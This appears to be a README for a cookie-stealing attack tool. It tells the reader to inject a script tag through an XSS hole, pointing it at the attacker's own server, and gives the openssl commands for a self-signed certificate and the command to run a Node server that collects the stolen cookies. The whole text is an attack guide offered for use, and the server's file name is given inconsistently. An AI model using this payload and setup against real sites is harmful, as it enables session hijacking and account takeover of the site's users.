Steal cookies with this script. Requires XSS attack prior. Inject this:
```
<script src="https://<your server>:<your port>">
```
Go into simpleServer.js, and change the connection parameters to suit your setup.

This is an https server, because many sites have httponly set for cookies. In order for this to work, we need to create a self-signed certificate. On \*nix systems, this can be done with openssl:
```
$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
$ openssl rsa -in key.pem -out keyDecrypt.pem
```
You will be prompted to create a password in the first command, and to enter it again in the second command. You will also be asked for basic information, such as your organization and location, for the certificate. The certificate will not be signed by any root authority (obviously.

Run the server with:
```
node simpleServe.js
```
You must have node installed. No node modules, other than the default http module that comes with node, are required to run this.

This attack assumes that the site is vulnerable to cookie stealing. There are plenty of protections that may prevent this attack from working properly.
